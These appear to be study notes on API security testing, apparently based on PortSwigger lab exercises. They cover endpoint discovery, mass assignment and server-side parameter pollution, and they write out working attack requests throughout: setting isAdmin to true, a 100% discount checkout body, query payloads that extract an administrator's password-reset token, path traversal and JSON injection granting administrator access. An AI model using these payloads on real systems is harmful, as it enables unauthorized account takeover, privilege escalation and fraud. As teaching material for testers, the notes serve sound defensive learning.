![[API Testing.png]]
# Recon

Start by identifying API endpoints - locations where an API receives requests about a specific resource on its server. For example:

```html
GET /api/books HTTP/1.1
Host: example.com
```

Once identified, determine how to interact with them which enables you to construct valid HTTP requests to test the API. Find out things such as:

- Input data the API processes, including both compulsory and optional parameters
- Types of requests the API accepts, including supported HTTP methods and media formats
- Rate limits and authentication mechanisms
# API Documentation

Even if API documentation is not openly available, you may be able to access it by browsing applications that use the API. Look for endpoints that may refer to API documentation, such as:

- /api
- /swagger/index.html
- /openapi.json

If you identify an endpoint for a resource, make sure to investigate the base path:

- /api/swagger/v1/users/123
- /api/swagger/v1
- /api/swagger
- /api

>[!info]
>Burp Scanner can crawl and audit OpenAPI documentation, or other documentation in JSON or YAML format. 
# Exploiting an API endpoint using documentation

Using all functionality of the application may uncover an API endpoint when updating certain details (i.e. email address):

- `/api/user/wiener`

Try requesting the base API path to disclose the API functionality in the response:

- `/api/`

You can potentially use the API to delete or modify other users:

- `DELETE /api/user/carlos`
# Identifying API Endpoints

Review any JavaScript files as these can disclose API functionality. Look for any suggested API endpoints such as `/api`. Try changing the HTTP method and media type (Content-Type header/request body) when requesting the API to determine what is accepted and each endpoint.

When interacting with API endpoints, review error messages and other responses - sometimes they can include information you can use to construct a valid HTTP request.

An API endpoint may support different HTTP methods - test all potential methods when investigating API endpoints. It may enable you to identify additional endpoint functionality, opening up more attack surface.

As an example, the endpoint /api/tasks may support the following:

- GET /api/tasks - retrieves a list of tasks
- POST /api/tasks - creates a new task
- DELETE /api/tasks/1 - deletes a task

>[!warning] 
>When testing different methods, target low-priority objects to avoid unintended consequences like altering critical items or creating excessive records.

Changing the media type for requests can disclose various things including:

- Trigger errors that disclose useful information
- Bypass flawed defences
- Take advantage of differences in processing logic. An API may be secure when handling JSON data but susceptible to injection attacks when dealing with XML.

Use Intruder to find hidden API endpoints by fuzzing the last resource:

- /api/user/update
# Find & Exploit Unused API Endpoint

Use all of the application's functionality that is available. As an example, when selecting an item to place in the shopping cart on an e-commerce site, an API endpoint may be discovered:

- /api/products/1/price

The request can be sent to Repeater and the HTTP method can be tested to identify which ones are accepted. An example is the PATCH method which may be used. Additionally, test the various media types that it accepts (eg. application/json).

The price may be able to be changed after identifying these:

```json
PATCH /api/products/1/price HTTP/2
Content-Type: application/json
Content-Length: 11
REDACTED...

{
	"price":5
}
```

Attempt to change the price via the PATCH method - may require authentication. Also attempt to change the content-type. It may only accept application/json for example. Attempt an empty JSON body at first:

```json
{}
```

Add any parameters that may be disclosed back to potentially modify certain items.
# Finding Hidden Parameters

There are numerous tools to help identify hidden parameters. Intruder allows you to automatically discover hidden parameters using a wordlist of common parameter names to replace existing parameters or add new parameters. 

[Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) allows you to guess 65,536 param names per request. It automatically guesses names relevant to the application, based on scope information. Content discovery tool also discovers content that is not linked, including parameters.

Consider an API for updating user information:

- `PUT /api/user/update`

Try fuzzing update to other functions like `delete` or `add`.

>[!info]
>Use wordlists based on common API naming conventions and industry terms.
# Mass Assignment

Mass assignment can create hidden parameters when software frameworks automatically bind request parameters to fields on an internal object.

Since mass assignment creates parameters from object fields, you can identify them by manually examining objects returned by the API. For example, a `PATCH /api/users` request which enables users to update their username and email may include the following JSON:

```json
{
    "username": "wiener",
    "email": "wiener@example.com",
}
```

A concurrent `GET /api/users/123` request returns the following:

```json
{
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": "false"
}
```

This can indicate that the hidden ID and isAdmin parameters are bound to the internal user object, alongside the updated username and email parameters. To test if you can modify the isAdmin paramter, add it to the request:

```json
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": false,
}
```

Also attempt to send a PATCH request with an invalid value:

```json
{
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": "foo"
}
```

If different behaviours occur, it suggests the invalid value impacts the query logic. Send a PATCH request with the value set to true:

```json
{
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": true
}
```

Use all the functionality to popular Burp's HTTP history for review. Afterwards, you may notice a request such as GET /api/checkout which returns the following information in response:

```json
{
  "chosen_discount": {
    "percentage": 0
  },
  "chosen_products": [
    {
      "product_id": "1",
      "name": "Lightweight \"l33t\" Leather Jacket",
      "quantity": 1,
      "item_price": 133700
    }
  ]
}
```

Or a POST request to /api/checkout which contains the request body:

```json
{
  "chosen_products": [
    {
      "product_id": "1",
      "quantity": 1
    }
  ]
}
```

Above, you could submit the following using the POST request to purchase the item for free:

```json
{
  "chosen_discount": {
    "percentage": 100
  },
  "chosen_products": [
    {
      "product_id": "1",
      "quantity": 1
    }
  ]
}
```
# Server-Side Parameter Pollution

Some systems contains internal APIs that are not directly accessible from the internet. Server-side parameter pollution occurs when a website embeds user input in a server-side request to an internal API without adequate encoding. This means an attacker may be able to manipulate or inject parameters which may enabled them to:

- Override existing parameters
- Modify the app behaviour
- Access unauthorized data

>[!info]
>You can test any user input for any kind of parameter pollution. For example, query parameters, form fields, headers, URL path parameters.
# Testing for Server-Side Parameter Pollution in query string

To test for it, place query syntax characters like `#`, `&` and "=" in the input and observe how the application responds.

For example, when you search for a user, the request is sent:

```html
GET /userSearch?name=peter&back=/home
```

To retrieve information, the server queries an internal API:

```html
GET /users/search?name=peter&publicProfile=true
```

You can use a URL encoded "#" character to attempt to truncate the server side request. Try also adding a string after the `#` character to interpret the response better. Try modifying the query string to:

```html
GET /userSearch?name=peter%23foo&back=/home
```

The front end may try to access the following:

```html
GET /users/search?name=peter#foo&publicProfile=true
```

Review the response for clues about whether the query has been truncated. For example, if the response returns the user `peter`, the server-side query may have been truncated. If an Invalid name error message is returned, the app may have treated `foo` as part of the username, suggesting the server-side request may not have been truncated.

If you are able to truncate the server-side request, this removes the requirement for the publicProfile to be set to true meaning you might be able to exploit it to return non-public user profiles.

>[!info]
>It's essential that you URL-encode the # character. Otherwise the front-end application will interpret it as a fragment identifier and it won't be passed to the internal API.

Use a URL encoded `&` character to attempt to add a second parameter. For example, modify the query string to be:

```html
GET /userSearch?name=peter%26foo=xyz&back=/home
```

This results in the server-side request to the internal API of:

```html
GET /users/search?name=peter&foo=xyz&publicProfile=true
```

Review the response for clues about whether the query has been truncated. For example, if the response is unchanged, it indicates the parameter was successfully injected but ignored by the app.

If you can modify the query string, attempt to add a second valid parameter to the server-side request. For example, there may be an email parameter - try adding it:

```html
GET /userSearch?name=peter%26email=foo&back=/home
```

This results in the server-side request to the internal API of:

```html
GET /users/search?name=peter&email=foo&publicProfile=true
```

To confirm if the app is vulnerable, try to override the original parameter by injecting a second parameter with the same name. For example:

```html
GET /userSearch?name=peter%26name=carlos&back=/home
```

Resulting in the following server-side request to the internal API:

```html
GET /users/search?name=peter&name=carlos&publicProfile=true
```

It interprets two name parameters. Impact can vary depending on different technologies:

- PHP parses the last parameter only - resulting in search for carlos
- ASP.NET combines them - resulting in a user search for peter,carlos which can result in an Invalid username error.
- NodeJS/ExpressJS parses the first parameter only - resulting in a search for peter.

>[!info]
>If you're able to override the original parameter, you may be able to conduct an exploit. For example, you could add name=administrator to the request. This may enable you to log in as the administrator user.
# Exploiting Server-side parameter pollution in query string

Try to submit fuzzing payloads to identify application behaviour. A forgotten password functionality may exist. As an example, the following payload may returned a "Parameter is not supported" message which indicates that the injected parameter was processed by the backend API:

```html
csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&username=administrator%26id=test
```

The payload below may return a "Field not specified" message:

```html
csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&username=administrator%23test
```

The payload below may return an Invalid username error message:

```html
csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&username=administratorxyz
```

Attempt to add a second parameter pair using a `&` character such as:

```html
csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&username=administrator%26x=z
```

It may return a parameter is not supported message, meaning the internal API interpreted it as a separate parameter, and not part of the username. From here, attempt to truncate the server-side query string via `#`:

```html
csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&username=administrator%23
```

An error message may be returned stating field is not specified meaning the server-side query may include an additional parameter called `field` which is removed via the `#` character. Adding the field parameter with an invalid value may result in an Invalid field message:

```html
csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&username=administrator%26field=x%23
```

Attempt to brute force the field value using Intruder and the "Server-side variable names" wordlist. It may return a result such as `email` with a 200 OK response. Change the value to email - if it is the original response, it suggests it to be a valid field type:

```html
csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&username=administrator%26field=email%23
```

Remember to analyse the JavaScript files as well such as `forgotPassword.js` which may include a password reset endpoint such as:

```bash
/forgot-password?reset_token=${resetToken}
```

Attempt to change the value of `field` to `reset_token` and resend - if it returns a password reset token, save it:

```html
csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&username=administrator%26field=reset_token%23
```

Try navigating to the endpoint with the reset token to see if it works. The request below could be submitted to successfully reset the password for the admin user:

```html
GET /forgot-password?reset_token=TOKEN-VALUE HTTP/2
```
# Server-Side Parameter Pollution in REST Paths

RESTful APIs may use parameter names and values in the URL such as:

```html
/api/users/123
```

Consider an app that can edit user profiles based on their username. Requests are sent to:

```html
GET /edit_profile.php?name=peter
```

Resulting in the server-side request of:

```html
GET /api/private/users/peter
```

Try manipulating server-side URL path parameters by adding path traversal sequences to modify parameters. For example, submit URL-encoded `peter/../admin` as the value of `name`:

```html
GET /edit_profile.php?name=peter%2f..%2fadmin
```

Which may result in:

```html
GET /api/private/users/peter/../admin
```

>[!info]
>If the server-side client or backend API normalize the path, it may be resolved to /api/private/users/admin.
# Server-Side Parameter Pollution in Structured Data Formats

You can manipulate parameters in the processing of other structured data formats like JSON or XML. Try injecting unexpected structured data into user inputs and see how it responds. For example, if you edit your name:

```html
POST /myaccount
name=peter
```

Which results in the server-side request of:

```html
PATCH /users/7312/update
{"name":"peter"}
```

You can attempt to add the `access_level` parameter to the request such as:

```html
POST /myaccount
name=peter","access_level":"administrator
```

If user input is added to JSON data without validation, it results in:

```html
PATCH /users/7312/update
{name="peter","access_level":"administrator"}
```

Which can result in the user `peter` being given admin access. Another example may be where client-side user input is in JSON data. When editing your name, it makes the request:

```html
POST /myaccount
{"name": "peter"}
```

Resulting in the following request:

```html
PATCH /users/7312/update
{"name":"peter"}
```

Attempting to add the `access_level` parameter to the request may look like:

```html
POST /myaccount
{"name": "peter\",\"access_level\":\"administrator"}
```

If user input is decoded and added to the server-side JSON data without encoding, it results in the following:

```html
PATCH /users/7312/update
{"name":"peter","access_level":"administrator"}
```

>[!info]
>Structured format injection can also occur in responses. For example, this can occur if user input is stored securely in a database, then embedded into a JSON response from a back-end API without adequate encoding. You can usually detect and exploit structured format injection in responses in the same way you can in requests.
# Automated Tools

Burp Scanner detects suspicious input transformation which occurs when an app receives user input, transforms it in some way, and performs further processing on the result. 

[Backslash Powered Scanner](https://portswigger.net/bappstore/9cff8c55432a45808432e26dbb2b41d8) can also be used to identify server-side injection vulnerabilities. It classifies inputs as boring, interesting or vulnerable.

